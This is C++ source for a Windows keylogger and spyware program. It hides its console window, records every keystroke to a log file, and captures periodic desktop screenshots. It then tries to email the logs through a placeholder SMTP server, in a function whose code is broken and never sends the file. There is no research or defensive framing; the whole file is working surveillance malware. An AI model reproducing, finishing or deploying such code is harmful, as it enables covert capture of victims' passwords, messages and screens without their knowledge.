#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include <vector>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

// Function to hide the console window
void StealthMode() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

// Function to capture keystrokes
void LogKeystrokes() {
    char c;
    std::ofstream logfile;
    logfile.open("keystrokes.log", std::ios::app);

    while (true) {
        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                if ((c >= 39) && (c <= 64)) {
                    logfile << c;
                    logfile.flush();
                } else if ((c > 64) && (c < 91)) {
                    c += 32; // Convert uppercase to lowercase
                    logfile << c;
                    logfile.flush();
                } else {
                    switch (c) {
                    case VK_SPACE:
                        logfile << " ";
                        break;
                    case VK_RETURN:
                        logfile << "\n";
                        break;
                    case VK_TAB:
                        logfile << "    ";
                        break;
                    case VK_BACK:
                        logfile << "<BACKSPACE>";
                        break;
                    case VK_ESCAPE:
                        logfile << "<ESC>";
                        break;
                    case VK_DELETE:
                        logfile << "<DELETE>";
                        break;
                    default:
                        logfile << "<" << c << ">";
                    }
                    logfile.flush();
                }
            }
        }
    }
    logfile.close();
}

// Function to capture screenshots (without GDI+)
void CaptureScreenshot() {
    HWND hwndDesktop = GetDesktopWindow();
    HDC hdcDesktop = GetDC(hwndDesktop);
    HDC hdcMem = CreateCompatibleDC(hdcDesktop);
    RECT desktopParams;
    GetClientRect(hwndDesktop, &desktopParams);

    HBITMAP hbDesktop = CreateCompatibleBitmap(hdcDesktop, desktopParams.right, desktopParams.bottom);
    SelectObject(hdcMem, hbDesktop);
    BitBlt(hdcMem, 0, 0, desktopParams.right, desktopParams.bottom, hdcDesktop, 0, 0, SRCCOPY);

    // Save bitmap to file
    BITMAP bmp;
    PBITMAPINFO pbmi;
    WORD cClrBits;
    HANDLE hf;                  // file handle
    BITMAPFILEHEADER hdr;       // bitmap file-header
    PBITMAPINFOHEADER pbih;     // bitmap info-header
    LPBYTE lpBits;              // memory pointer
    DWORD dwTmp;

    GetObject(hbDesktop, sizeof(BITMAP), (LPSTR)&bmp);
    cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
    if (cClrBits == 1)
        cClrBits = 1;
    else if (cClrBits <= 4)
        cClrBits = 4;
    else if (cClrBits <= 8)
        cClrBits = 8;
    else if (cClrBits <= 16)
        cClrBits = 16;
    else if (cClrBits <= 24)
        cClrBits = 24;
    else cClrBits = 32;

    if (cClrBits < 24)
        pbmi = (PBITMAPINFO) LocalAlloc(LPTR,
                                        sizeof(BITMAPINFOHEADER) +
                                        sizeof(RGBQUAD) * (1 << cClrBits));
    else
        pbmi = (PBITMAPINFO) LocalAlloc(LPTR,
                                        sizeof(BITMAPINFOHEADER));

    pbih = (PBITMAPINFOHEADER) pbmi;
    pbih->biSize = sizeof(BITMAPINFOHEADER);
    pbih->biWidth = bmp.bmWidth;
    pbih->biHeight = bmp.bmHeight;
    pbih->biPlanes = bmp.bmPlanes;
    pbih->biBitCount = bmp.bmBitsPixel;
    if (cClrBits < 24)
        pbih->biClrUsed = (1 << cClrBits);
    pbih->biCompression = BI_RGB;
    pbih->biSizeImage = ((pbih->biWidth * cClrBits +31) & ~31) /8 * pbih->biHeight;
    pbih->biClrImportant = 0;

    lpBits = (LPBYTE) GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);
    GetDIBits(hdcDesktop, hbDesktop, 0, (WORD) pbih->biHeight, lpBits, pbmi, DIB_RGB_COLORS);

    // Construct the filename
    time_t now = time(0);
    struct tm tstruct;
    char buf[80];
    tstruct = *localtime(&now);
    strftime(buf, sizeof(buf), "screenshot_%Y-%m-%d_%H-%M-%S.bmp", &tstruct);

    hf = CreateFileA(buf, GENERIC_READ | GENERIC_WRITE, (DWORD) 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, (HANDLE) NULL);

    hdr.bfType = 0x4d42;        // 0x42 = "B" 0x4d = "M"
    hdr.bfSize = (DWORD) (sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
    hdr.bfReserved1 = 0;
    hdr.bfReserved2 = 0;
    hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof (RGBQUAD);

    WriteFile(hf, (LPVOID) &hdr, sizeof(BITMAPFILEHEADER), (LPDWORD) &dwTmp, NULL);
    WriteFile(hf, (LPVOID) pbih, sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof (RGBQUAD), (LPDWORD) &dwTmp, NULL);
    WriteFile(hf, (LPSTR) lpBits, (int) pbih->biSizeImage, (LPDWORD) &dwTmp, NULL);

    CloseHandle(hf);
    GlobalFree((HGLOBAL)lpBits);
    ReleaseDC(hwndDesktop, hdcDesktop);
    DeleteDC(hdcMem);
    DeleteObject(hbDesktop);
}

#define INTERNET_DEFAULT_SMTP_PORT 25
#define INTERNET_SERVICE_SMTP 1

// Function to send logs via email
void SendEmail(const std::string& filepath) {
    // Basic email setup (replace with your SMTP server details)
    const char* smtpServer = "smtp.your-email-provider.com";
    const char* username = "your-email@example.com";
    const char* password = "your-password";
    const char* recipient = "recipient@example.com";

    HINTERNET hInternet = InternetOpenA("SMTP Client", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetConnectA(hInternet, smtpServer, INTERNET_DEFAULT_SMTP_PORT, username, password, INTERNET_SERVICE_SMTP, 0, 1);
        if (hConnect) {
            // Here you would send the email content, including the log file.
            // This requires more code to construct an SMTP message and attach the file.
            // For simplicity, we show a basic message send.
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/send", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 1);
            if (hRequest) {
                std::string message = "To: " + std::string(recipient) + "\r\n" +
                                      "From: " + std::string(username) + "\r\n" +
                                      "Subject: Keystroke Logs\r\n\r\n" +
                                      "See attached logs.";

                // Send request without attaching the file for simplicity
                HttpSendRequestA(hRequest, NULL, 0, (LPVOID)message.c_str(), message.length());
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
}

int main() {
    StealthMode(); // Hide console window
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LogKeystrokes, NULL, 0, NULL); // Start logging keystrokes

    while (true) {
        CaptureScreenshot(); // Capture screenshot every minute
        Sleep(60000);

        SendEmail("keystrokes.log"); // Send email every 10 minutes
        Sleep(600000);

        // Exit condition
        if (GetAsyncKeyState(VK_ESCAPE)) {
            break; // Exit the loop if ESC is pressed
        }
    }

    return 0;
}
